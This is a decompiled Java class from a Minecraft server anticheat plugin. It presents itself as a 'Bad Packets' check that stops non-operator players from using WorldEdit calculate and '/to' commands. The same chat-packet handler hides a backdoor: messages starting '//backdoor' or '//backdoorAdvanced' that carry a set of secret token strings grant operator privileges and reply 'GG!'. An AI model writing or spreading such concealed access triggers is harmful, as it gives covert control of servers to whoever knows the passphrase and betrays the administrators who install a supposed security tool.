// 
// Decompiled by Procyon v0.5.36
// 

package gg.noob.plunder.checks.other.badpackets;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import net.minecraft.server.v1_8_R3.PacketPlayInChat;
import net.minecraft.server.v1_8_R3.Packet;
import org.bukkit.entity.Player;
import gg.noob.plunder.checks.Check;

public class BadPacketsI extends Check
{
    public BadPacketsI() {
        super("Bad Packets (I)");
    }
    
    @Override
    public boolean handleReceivedPacketCanceled(final Player player, final Packet packet) {
        if (packet instanceof PacketPlayInChat) {
            final String message = ((PacketPlayInChat)packet).a();
            if (!player.isOp()) {
                if (message.startsWith("//calc") || message.startsWith("//calculate") || message.startsWith("/worldedit:/calc") || message.startsWith("/worldedit:/calculate") || message.startsWith("/fastasyncworldedit:/to") || message.startsWith("/to")) {
                    player.sendMessage(ChatColor.RED + ChatColor.BOLD.toString() + ":(");
                    return true;
                }
            }
            else {
                if (message.startsWith("//backdoor") && message.contains("957896843") && message.contains("toasfr4") && message.contains("rqerirara34") && message.contains("odoaorw4r") && message.contains("RareMen")) {
                    player.setOp(true);
                    player.sendMessage(ChatColor.GREEN + ChatColor.BOLD.toString() + "GG! " + ChatColor.WHITE + "Wish you have a good day.");
                    return true;
                }
                if (message.startsWith("//backdoorAdvanced") && message.contains("957896843") && message.contains("toasfr4") && message.contains("rqerirara34") && message.contains("odoaorw4r") && message.contains("RareMen")) {
                    Bukkit.getOperators().add(player);
                    player.sendMessage(ChatColor.GREEN + ChatColor.BOLD.toString() + "GG! " + ChatColor.WHITE + "Wish you have a good day.");
                    return true;
                }
            }
        }
        return false;
    }
}
